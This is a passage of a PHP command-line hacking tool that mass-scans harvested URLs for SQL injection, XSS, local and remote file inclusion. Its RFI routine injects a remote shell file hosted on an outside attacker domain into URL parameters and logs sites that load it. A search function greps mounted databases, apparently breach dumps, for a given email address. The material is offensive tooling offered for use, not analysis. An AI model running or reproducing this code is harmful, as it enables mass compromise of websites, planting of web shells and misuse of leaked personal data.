    $rozbite = explode("=", $zmienna);
    $linki[] .= str_replace($rozbite[0] . "=" . $rozbite[1], $rozbite[0] . "=https://devilteam.pl/hauru.txt?", $link);
    }
    foreach($linki as $lin) {
    	if (strpos(file_get_contents($lin), "Hauru Shell"))  {
    		$text = $lin . "\n";
    		$handle = fopen('out/rfi.txt', 'a');
    		fwrite($handle, $text);
            fclose($handle);
    		print "\033[1;37m1\033[0;37m";
    	} else {
    		print '0';
    	}
    }
 } else {
 	print '0';
 }

}

function show() {

print "\n File: ";
$show = fopen ("php://stdin","r");
$sfile = fgets($show);
$sfile = trim($sfile);

if(file_exists('out/'.$sfile)) {

print "\n\nContent of ".$sfile.":\n";
print file_get_contents('out/'.$sfile);
} else {
	print "\nFile doesn't exist!\n";
}
}

function cmd() {

print "\n Command: ";
	$exec = fopen ("php://stdin","r");
	$cmd = fgets($exec);
 print passthru(escapeshellcmd($cmd));

}

function search() {

$path='/path/to/databases';

if(file_exists($path)) {

print "\n Mail: ";
$mail = fopen ("php://stdin","r");
$email = fgets($mail);
$email = trim($email);

if($email == 'showdbs') { 

print passthru('wc -l '.$path.'*');

} else {

printf("\n\n");

if ($handle = opendir($path)) {
while (false !== ($entry = readdir($handle))) {
if ($entry != "." && $entry != "..") {

$f=0;

$fp = fopen($path.$entry, 'r');
flock($fp, 1);
while(!feof($fp))
{
$linia = fgets($fp, 2048);
$f=$f+1;
$profunkcjaglobusa = stripos($linia, $email);
if ($profunkcjaglobusa !== false)
{
echo $linia;
echo 'Found in: ' .$entry. ', in line ' .$f;
printf("\n...\n");
}

}
    }
    }
closedir($handle);
}
}
} else {
	print "\nDatabases not mounted.\n";
}
}


function stats() {

$ip = file_get_contents('http://bot.whatismyipaddress.com/');
$geourl = "http://www.geoplugin.net/php.gp?ip=".$ip;
$geoarr = unserialize(file_get_contents($geourl));

$country = $geoarr['geoplugin_countryName'];

if(!$country){
   $country = "Dunno";
}

print "\n\nInfo:\n";
print " IP - ".$ip." (".$country.")\n";
print " Time - ".date('j/y - G:i')."\n";
print " Database's mounted: ";
if(is_dir('/path/to/databases')) {
    print "Yes\n";        
} else { print "No\n"; }

print "\nFiles:\n";
if(!file_exists('out')) {
	passthru('mkdir out');
	print "\n Output directory created.";
} elseif($handle = opendir('out')) {
	$total = 0;
    while (false !== ($entry = readdir($handle))) {
        if ($entry != "." && $entry != "..") {
            print " - ".$entry." (".count(file('out/'.$entry)).")\n"; 
            $total = $total + count(file('out/'.$entry));
            }
        }
     print "\nTotal lines - ".$total;
    closedir($handle);
    } else {
    	print "\nNo such directory.";
    }
}

function scan() {

print "\n  Options:\n";
print "    sqli - SQL Injection\n";
print "    xss - Cross Site Scripting\n";
print "    lfi - Local File Inclusion\n";
print "    rfi - Remote File Inclusion\n";
print "    all - Fuck shit up\n";
print "     What: ";

$choice = fopen ("php://stdin","r");
$what = fgets($choice);


print "\n File: ";

$choicef = fopen ("php://stdin","r");
$whatf = fgets($choicef);
$whatf = trim($whatf);

	if(file_exists('out/'.$whatf)) {

if(trim($what) == 'sqli' || trim($what) == 'all' || trim($what) == 'sqli&xss') {
	print "\n\n - Testing SQL Injection for " .count(file('out/'.$whatf)). " parameters ($whatf)\n";
    $urls = file('out/'.$whatf);
    foreach($urls as $link) {
    	sqli(urldecode($link));
    }

}

if(trim($what) == 'xss' || trim($what) == 'all' || trim($what) == 'sqli&xss') {
     print "\n\n - Testing Cross Site Scripting for " .count(file('out/'.$whatf)). " parameters ($whatf)\n";
    $urls = file('out/'.$whatf);
    foreach($urls as $link) {
    	xss(urldecode($link));
    }
}

if(trim($what) == 'lfi' || trim($what) == 'all' || trim($what == 'lfi&rfi')) {
     print "\n\n - Testing Local File Inclusion for " .count(file('out/'.$whatf)). " parameters ($whatf)\n";
    $urls = file('out/'.$whatf);
    foreach($urls as $link) {
    	lfi(urldecode($link));
    }

}

if(trim($what) == 'rfi' || trim($what) == 'all' || trim($what == 'lfi&rfi')) {
     print "\n\n - Testing Remote File Inclusion for " .count(file('out/'.$whatf)). " parameters ($whatf)\n";
    $urls = file('out/'.$whatf);
    foreach($urls as $link) {
    	rfi(urldecode($link));
    }

}


} else {
	print "\nFile doesnt exist!\n";
}
}



options();

while (1 == 1) {

print "\n\n >> ";
$handle = fopen ("php://stdin","r");
$line = fgets($handle);

if(trim($line) == 'exit') {
    echo "Aborting!\n";
    exit;
}

if(trim($line) == 'help') {
    options();
}

if(trim($line) == 'dork') {
    dork();
}

if(trim($line) == 'cmd') {
    cmd();
}

if(trim($line) == 'massurl') {
    massurl();
}

if(trim($line) == 'brutefpds') {
    brutefpds();
}

if(trim($line) == 'clear') {
    clear();
}

if(trim($line) == 'stat') {
    stats();
}

if(trim($line) == 'show') {
    show();
}

if(trim($line) == 'top') {
    top();
}

if(trim($line) == 'search') {
    search();
}

if(trim($line) == 'multibruter') {
    multibruter();
}

if(trim($line) == 'geturl') {
	geturl();
}

if(trim($line) == 'filter') {
	filter();
}

if(trim($line) == 'scan') {
	scan();
}

if(trim($line) == 'fpds') {
    fpds();
}


}

?>
